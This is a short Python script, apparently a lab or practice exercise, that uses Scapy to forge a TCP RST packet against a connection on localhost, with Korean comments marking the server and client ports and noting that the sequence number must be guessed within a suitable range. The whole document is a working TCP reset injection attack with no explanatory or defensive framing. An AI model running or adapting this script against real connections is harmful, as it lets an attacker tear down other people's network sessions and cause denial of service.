from scapy.all import *

target_ip = "127.0.0.1"
sport = 8888           # 서버 포트
dport = 64857         # 클라이언트 포트
seq = 100000000        # 적절한 범위 내 추정 필요

ip = IP(src=target_ip, dst=target_ip)
tcp = TCP(sport=sport, dport=dport, flags="R", seq=seq)

send(ip/tcp, verbose=1)